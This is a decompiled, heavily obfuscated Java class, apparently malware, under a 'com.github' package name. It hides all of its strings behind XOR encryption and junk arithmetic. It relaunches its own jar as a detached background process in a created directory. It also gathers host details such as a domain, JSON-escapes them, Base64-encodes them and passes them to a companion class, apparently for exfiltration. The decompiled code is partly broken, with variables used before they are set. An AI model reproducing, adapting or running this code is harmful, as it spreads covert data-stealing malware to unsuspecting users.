/*
 * Decompiled with CFR 0.152.
 */
package com.github;

import com.github.sxNsjhjhm;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.util.Base64;

public class jutxsw {
    public jutxsw() {
        jutxsw aiKyynyvPtux;
    }

    public static void main(String[] stringArray) {
        String[] aData;
        int n2 = 5192066;
        if (n2 >= 5192066 && n2 < 6280463) {
            n2 = 1254360318;
            n2 <<= 24;
            n2 >>>= 16;
            int n3 = -1348669007;
            n3 += 158;
            n3 ^= 0x1A0042D4;
            n3 <<= 2;
        }
        if (aData.length > 0) {
            String string = aData[0];
            char[] cArray = "\r\uf782\u71d9\ucfb2\u05ba\ue96b\ud3a1\ucc21\ud637\uf269\ueae0\u640a\u4741\u89ef\uf7af\u71ab\ucfd7\u05c9\ue91f\ud3c0\ucc53\ud643\uf20c\uea84".toCharArray();
            char c2 = cArray[0];
            int n4 = cArray.length - 1 - c2;
            char[] cArray2 = new char[n4];
            int n5 = 0;
            do {
                cArray2[n5] = (char)(cArray['\u0001' + c2 + n5] ^ cArray[1 + n5 % c2]);
            } while (++n5 < n4);
            if (!string.equals(new String(cArray2))) {
                sxNsjhjhm.main(aData);
                return;
            }
        }
        for (String eLen : aData) {
            char[] cArray = "\u000b\u7ed3\uf1d1\u51bd\u4e10\u165e\u4bf1\uaf75\u8e47\u7530\u0986\u34e9\u7efe\uf1a3\u51d8\u4e63\u162a\u4b90\uaf07\u8e33\u7555\u09e2".toCharArray();
            char c3 = cArray[0];
            int n6 = cArray.length - 1 - c3;
            char[] cArray3 = new char[n6];
            for (int i2 = 0; i2 < n6; ++i2) {
                cArray3[i2] = (char)(cArray['\u0001' + c3 + i2] ^ cArray[1 + i2 % c3]);
            }
            if (!eLen.equals(new String(cArray3))) continue;
            jutxsw.run();
            return;
        }
        try {
            String string = "\u0007\u7f7d\uc1f2\u0891\uf225\ub92a\ue880\uc01c\u7f17\uc193\u08e7\uf244\ub904\ue8e8\uc073\u7f10\uc197";
            char c4 = string.charAt(0);
            int n7 = string.length() - 1 - c4;
            StringBuilder stringBuilder = new StringBuilder(n7);
            for (int i3 = 0; i3 < n7; ++i3) {
                stringBuilder.append((char)(string.charAt('\u0001' + c4 + i3) ^ string.charAt(1 + i3 % c4)));
            }
            String ziluvErk = System.getProperty(stringBuilder.toString());
            String[] stringArray2 = new String[2];
            char[] cArray = "\u0006\ud118\u2c0d\uacd8\u3591\ub258\u0315\ud17a\u2c64\uacb6".toCharArray();
            char c5 = cArray[0];
            int n8 = cArray.length - 1 - c5;
            char[] cArray4 = new char[n8];
            for (int i4 = n8 - 1; i4 >= 0; --i4) {
                cArray4[i4] = (char)(cArray['\u0001' + c5 + i4] ^ cArray[1 + i4 % c5]);
            }
            stringArray2[0] = new String(cArray4);
            String string2 = "\r\ufceb\ucee6\ud211\ubcaf\u514b\u2c8b\u39ea\u0ef3\u61b0\udda1\u10f8\uead8\ue8dd\ufd55\ucf47\ud287\ubd10\u51c2\u2cb9\u3a4f\u0f6b\u6215";
            char c6 = string2.charAt(0);
            int n9 = string2.length() - 1 - c6;
            StringBuilder stringBuilder2 = new StringBuilder(n9);
            for (int i5 = 0; i5 < n9; ++i5) {
                stringBuilder2.append((char)(string2.charAt('\u0001' + c6 + i5) - string2.charAt(1 + i5 % c6)));
            }
            stringArray2[1] = stringBuilder2.toString();
            Path jrjveScrOd = Path.of(ziluvErk, stringArray2);
            if (!Files.exists(jrjveScrOd, new LinkOption[0])) {
                String[] stringArray3 = new String[2];
                char[] cArray5 = "\u0007\u2851\ua9ed\u3591\uf6b1\udb72\u5d8c\u15e8\u2833\ua984\u35ff".toCharArray();
                char c7 = cArray5[0];
                int n10 = cArray5.length - 1 - c7;
                char[] cArray6 = new char[n10];
                for (int i6 = 0; i6 < n10; ++i6) {
                    cArray6[i6] = (char)(cArray5['\u0001' + c7 + i6] ^ cArray5[1 + i6 % c7]);
                }
                stringArray3[0] = new String(cArray6);
                char[] cArray7 = "\r\u1488\u3d44\u63c6\ua3d5\u2f79\ucd11\u7654\ud502\ue026\uecbc\ue660\ued86\u793f\u14e2\u3d25\u63b0\ua3b4\u2f57\ucd74\u762c\ud567".toCharArray();
                char c8 = cArray7[0];
                int n11 = cArray7.length - c8 - 1;
                char[] cArray8 = new char[n11];
                for (int i7 = 0; i7 < n11; ++i7) {
                    cArray8[i7] = (char)(cArray7[c8 + '\u0001' + i7] ^ cArray7[1 + i7 % c8]);
                }
                stringArray3[1] = new String(cArray8);
                jrjveScrOd = Path.of(ziluvErk, stringArray3);
            }
            String kecyqsFcqeCeapru = new File(jutxsw.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            char[] cArray9 = "\ua8fb\u53ec\u496f\u720b\u64dd\ua660\u6903\u7a47\u57f7\u7d76\ue7a6\u3a3d\ua8b7\u53a3\u492c\u724a\u6491\ua621\u6953\u7a17\u57b3\u7d37\ue7f2\u3a7c\u599f\r".toCharArray();
            char c9 = cArray9[cArray9.length - 1];
            int n12 = cArray9.length - c9 - 1;
            char[] cArray10 = new char[n12];
            for (int i8 = 0; i8 < n12; ++i8) {
                cArray10[i8] = (char)(cArray9[i8] ^ cArray9[n12 + i8 % c9]);
            }
            String string3 = System.getenv(new String(cArray10));
            String[] stringArray4 = new String[3];
            char[] cArray11 = "\u000e\u54aa\ub4e9\uf679\ucb29\u701a\u54aa\u7a9b\ub884\ucb49\uaa74\ua3b7\uc529\u6f0d\uc606\u54e7\ub480\uf61a\ucb5b\u7075\u54d9\u7af4\ub8e2\ucb3d".toCharArray();
            char c10 = cArray11[0];
            int n13 = cArray11.length - 1 - c10;
            char[] cArray12 = new char[n13];
            int n14 = 0;
            do {
                cArray12[n14] = (char)(cArray11['\u0001' + c10 + n14] ^ cArray11[1 + n14 % c10]);
            } while (++n14 < n13);
            stringArray4[0] = new String(cArray12);
            char[] cArray13 = "\u0005\ud20c\u5f3c\u43dc\u4c91\u9b10\ud25b\u5f55\u43b2\u4cf5\u9b7f\ud27b\u5f4f".toCharArray();
            char c11 = cArray13[0];
            int n15 = cArray13.length - 1 - c11;
            char[] cArray14 = new char[n15];
            for (int i9 = 0; i9 < n15; ++i9) {
                cArray14[i9] = (char)(cArray13['\u0001' + c11 + i9] ^ cArray13[1 + i9 % c11]);
            }
            char[] cArray15 = new char[n15];
            System.arraycopy(cArray14, 0, cArray15, 0, n15);
            stringArray4[1] = new String(cArray15);
            char[] cArray16 = "\u000e\u5089\u871f\u93d9\u6e7e\u6868\u3b03\ud6dd\u24b2\u0501\u05d3\u52a4\ub3f7\u513e\u69d0\u50c7\u876b\u9389\u6e0c\u6807\u3b65\ud6b4\u24de\u0564\u059a\u52ca\ub393\u515b\u69a8".toCharArray();
            char c12 = cArray16[0];
            int n16 = cArray16.length - 1 - c12;
            char[] cArray17 = new char[n16];
            for (int i10 = 0; i10 < n16; ++i10) {
                cArray17[i10] = (char)(cArray16['\u0001' + c12 + i10] ^ cArray16[1 + i10 % c12]);
            }
            char[] cArray18 = new char[n16];
            System.arraycopy(cArray17, 0, cArray18, 0, n16);
            stringArray4[2] = new String(cArray18);
            Path et_kh = Path.of(string3, stringArray4);
            Files.createDirectories(et_kh, new FileAttribute[0]);
            String zg_nkeh_eqxzg = jutxsw.class.getName();
            String[] stringArray5 = new String[5];
            stringArray5[0] = jrjveScrOd.toString();
            char[] cArray19 = "\u0005\u1a4e\u0411\u4161\u31ec\u5eb6\u1a63\u0472\u4111".toCharArray();
            char c13 = cArray19[0];
            int n17 = cArray19.length - 1 - c13;
            char[] cArray20 = new char[n17];
            for (int i11 = 0; i11 < n17; ++i11) {
                cArray20[i11] = (char)(cArray19['\u0001' + c13 + i11] ^ cArray19[1 + i11 % c13]);
            }
            char[] cArray21 = new char[n17];
            System.arraycopy(cArray20, 0, cArray21, 0, n17);
            stringArray5[1] = new String(cArray21);
            stringArray5[2] = kecyqsFcqeCeapru;
            stringArray5[3] = zg_nkeh_eqxzg;
            char[] cArray22 = "\u7f4f\uf678\ub7fe\u090c\u170b\u7f03\uf678\ub7ef\u091a\u171b\u7f62\uf60a\ub79b\u097f\u177f\u0005".toCharArray();
            char c14 = cArray22[cArray22.length - 1];
            int n18 = cArray22.length - c14 - 1;
            char[] cArray23 = new char[n18];
            for (int i12 = 0; i12 < n18; ++i12) {
                cArray23[i12] = (char)(cArray22[i12] ^ cArray22[n18 + i12 % c14]);
            }
            stringArray5[4] = new String(cArray23);
            ProcessBuilder mStr = new ProcessBuilder(stringArray5);
            char[] cArray24 = "\u000e\u7f31\u8d9a\udfb2\u19cc\u167d\u93c8\u835c\u7953\u1558\u5ff5\u8616\ue3b1\uce34\u6e10\u7f7f\u8def\udffe".toCharArray();
            char c15 = cArray24[0];
            int n19 = cArray24.length - 1 - c15;
            char[] cArray25 = new char[n19];
            for (int i13 = 0; i13 < n19; ++i13) {
                cArray25[i13] = (char)(cArray24['\u0001' + c15 + i13] - cArray24[1 + i13 % c15]);
            }
            mStr.redirectInput(ProcessBuilder.Redirect.from(new File(new String(cArray25))));
            char[] cArray26 = "\u0005\ue955\u399e\u284e\uda74\u993c\ue90a\u39ed\u283e\uda15\u994b\ue93b\u39b0\u2822\uda1b\u995b".toCharArray();
            char c16 = cArray26[0];
            int n20 = cArray26.length - 1 - c16;
            char[] cArray27 = new char[n20];
            for (int i14 = 0; i14 < n20; ++i14) {
                cArray27[i14] = (char)(cArray26['\u0001' + c16 + i14] ^ cArray26[1 + i14 % c16]);
            }
            char[] cArray28 = new char[n20];
            System.arraycopy(cArray27, 0, cArray28, 0, n20);
            mStr.redirectOutput(ProcessBuilder.Redirect.appendTo(et_kh.resolve(new String(cArray28)).toFile()));
            mStr.redirectErrorStream(true);
            mStr.directory(et_kh.toFile());
            mStr.start();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void run() {
        int n2 = -991453464;
        if ((n2 & 0xC4E79EE8) == -991453464) {
            n2 = 3051;
            n2 *= 118;
        }
        sxNsjhjhm Bgig4__ToL = new sxNsjhjhm();
        String xrsI_zMgK_TwtT_ZuiU = Bgig4__ToL.getDomain();
        String aKc7jQ = sxNsjhjhm.DinwT();
        String foundMin = sxNsjhjhm.qBxiqqutoz();
        String string = jutxsw.jzMd(xrsI_zMgK_TwtT_ZuiU);
        String string2 = jutxsw.jzMd(foundMin);
        String string3 = jutxsw.jzMd(aKc7jQ);
        StringBuilder stringBuilder = new StringBuilder();
        String string4 = "\u000b\ubb32\u63ef\u65e6\u7605\ua504\u4384\u5cad\uecca\u4d0a\u659b\ude89\ubbad\u6411\u665b\u7678\ua569\u43f6\u5cf6\ued2e\u4d2c\u65d5\udeab";
        char c2 = string4.charAt(0);
        int n3 = string4.length() - 1 - c2;
        StringBuilder stringBuilder2 = new StringBuilder(n3);
        for (int i2 = 0; i2 < n3; ++i2) {
            stringBuilder2.append((char)(string4.charAt('\u0001' + c2 + i2) - string4.charAt(1 + i2 % c2)));
        }
        StringBuilder stringBuilder3 = stringBuilder.append(stringBuilder2.toString()).append(string3);
        char[] cArray = "\u9a1e\ue063\uded1\ub7d0\u7e5f\ua96c\ucf37\u9a06\ue06d\u9a3c\ue04f\udef3\ub7a4\u7e3e\ua90b\ucf15\u0007".toCharArray();
        char c3 = cArray[cArray.length - 1];
        int n4 = cArray.length - c3 - 1;
        char[] cArray2 = new char[n4];
        for (int i3 = 0; i3 < n4; ++i3) {
            cArray2[i3] = (char)(cArray[i3] ^ cArray[n4 + i3 % c3]);
        }
        StringBuilder stringBuilder4 = stringBuilder3.append(new String(cArray2)).append(string2);
        char[] cArray3 = "\n\u82d8\ub830\ua2a7\u747e\u33c0\u3e2f\u7b80\u6689\u5d81\u6bc2\u82fa\ub81c\ua285\u741a\u33af\u3e42\u7be1\u66e0\u5def\u6be0\u82e2\ub812".toCharArray();
        char c4 = cArray3[0];
        int n5 = cArray3.length - 1 - c4;
        char[] cArray4 = new char[n5];
        int n6 = 0;
        do {
            cArray4[n6] = (char)(cArray3['\u0001' + c4 + n6] ^ cArray3[1 + n6 % c4]);
        } while (++n6 < n5);
        StringBuilder stringBuilder5 = stringBuilder4.append(new String(cArray4)).append(string);
        char[] cArray5 = "\b\ue64e\u99d5\u2e99\u45c1\u4feb\ucdcf\ua594\u997a\ue66c\u99f9\u2ebb\u45a4\u4f85\ucdb9\ua5b6\u9940\ue66c\u9991\u2ef6\u45b4\u4f89\ucda3\ua5f1\u9939\ue622\u99bc\u2efa\u45aa\u4fc9\ucdb2".toCharArray();
        char c5 = cArray5[0];
        int n7 = cArray5.length - 1 - c5;
        char[] cArray6 = new char[n7];
        int n8 = 0;
        do {
            cArray6[n8] = (char)(cArray5['\u0001' + c5 + n8] ^ cArray5[1 + n8 % c5]);
        } while (++n8 < n7);
        String krzo_qlure_rxxky_guajed = stringBuilder5.append(new String(cArray6)).toString();
        String sourceAcc = Base64.getEncoder().encodeToString(krzo_qlure_rxxky_guajed.getBytes(StandardCharsets.UTF_8));
        sxNsjhjhm.main(new String[]{sourceAcc});
    }

    private static String jzMd(String string) {
        String mWhQ_uyls_DeDY_Bcdz;
        int n2 = 1215379489;
        if (n2 * 1 == 1215379489) {
            n2 = 16788;
            n2 *= 21;
        }
        if (mWhQ_uyls_DeDY_Bcdz == null) {
            return "";
        }
        StringBuilder qzfjCkki = new StringBuilder();
        block7: for (char jjzNll : mWhQ_uyls_DeDY_Bcdz.toCharArray()) {
            switch (jjzNll) {
                case '\"': {
                    char[] cArray = "\r\u73b4\u9583\ucdc8\uf573\uea1a\uebc9\uda07\u904d\u6cf0\udd8d\ud3fd\u4cd1\ue4f8\u7410\u95a5".toCharArray();
                    char c2 = cArray[0];
                    int n3 = cArray.length - 1 - c2;
                    char[] cArray2 = new char[n3];
                    for (int i2 = 0; i2 < n3; ++i2) {
                        cArray2[i2] = (char)(cArray['\u0001' + c2 + i2] - cArray[1 + i2 % c2]);
                    }
                    qzfjCkki.append(new String(cArray2));
                    continue block7;
                }
                case '\\': {
                    char[] cArray = "\u0005\udabb\uacd7\ua63a\uf1d2\u4170\udae7\uac8b".toCharArray();
                    char c3 = cArray[0];
                    int n4 = cArray.length - 1 - c3;
                    char[] cArray3 = new char[n4];
                    for (int i3 = n4 - 1; i3 >= 0; --i3) {
                        cArray3[i3] = (char)(cArray['\u0001' + c3 + i3] ^ cArray[1 + i3 % c3]);
                    }
                    qzfjCkki.append(new String(cArray3));
                    continue block7;
                }
                case '\n': {
                    char[] cArray = "\r\u0806\u6976\uff64\ud290\ue26f\u56d2\u809e\uef61\ucc58\u6468\u9890\ud41b\u5040\u085a\u6918".toCharArray();
                    char c4 = cArray[0];
                    int n5 = cArray.length - 1 - c4;
                    char[] cArray4 = new char[n5];
                    for (int i4 = 0; i4 < n5; ++i4) {
                        cArray4[i4] = (char)(cArray['\u0001' + c4 + i4] ^ cArray[1 + i4 % c4]);
                    }
                    char[] cArray5 = new char[n5];
                    System.arraycopy(cArray4, 0, cArray5, 0, n5);
                    qzfjCkki.append(new String(cArray5));
                    continue block7;
                }
                case '\r': {
                    char[] cArray = "\u000b\uf7ed\u1bba\u13f2\u9662\u41f6\ub7ef\u2f5b\ub16b\udc20\u6702\u6b8f\uf7b1\u1bc8".toCharArray();
                    char c5 = cArray[0];
                    int n6 = cArray.length - 1 - c5;
                    char[] cArray6 = new char[n6];
                    for (int i5 = 0; i5 < n6; ++i5) {
                        cArray6[i5] = (char)(cArray['\u0001' + c5 + i5] ^ cArray[1 + i5 % c5]);
                    }
                    qzfjCkki.append(new String(cArray6));
                    continue block7;
                }
                case '\t': {
                    char[] cArray = "\r\u9eeb\u5c7f\u665f\u4f30\u8cd1\uc31d\u8815\u34d9\ufdb3\u9588\u25f9\ufd07\u7b0a\u9eb7\u5c0b".toCharArray();
                    char c6 = cArray[0];
                    int n7 = cArray.length - 1 - c6;
                    char[] cArray7 = new char[n7];
                    int n8 = 0;
                    do {
                        cArray7[n8] = (char)(cArray['\u0001' + c6 + n8] ^ cArray[1 + n8 % c6]);
                    } while (++n8 < n7);
                    qzfjCkki.append(new String(cArray7));
                    n2 = -141965528;
                    if ((n2 & 0xF789C728) != -141965528) continue block7;
                    n2 = 13683;
                    n2 *= 50;
                    long l2 = 8566775290137957006L;
                    l2 &= 0xCB6A652B688D41D1L;
                    l2 |= 0xB392C271536E7898L;
                    continue block7;
                }
                default: {
                    if (jjzNll < ' ') {
                        char[] cArray = "\u0004\u0fe3\u21ac\u8c4b\u3bf7\u103f\u2221\u8c70\u3c27\u1017\u2224".toCharArray();
                        char c7 = cArray[0];
                        int n9 = cArray.length - 1 - c7;
                        char[] cArray8 = new char[n9];
                        for (int i6 = 0; i6 < n9; ++i6) {
                            cArray8[i6] = (char)(cArray['\u0001' + c7 + i6] - cArray[1 + i6 % c7]);
                        }
                        qzfjCkki.append(String.format(new String(cArray8), jjzNll));
                        continue block7;
                    }
                    qzfjCkki.append(jjzNll);
                }
            }
        }
        return qzfjCkki.toString();
    }
}

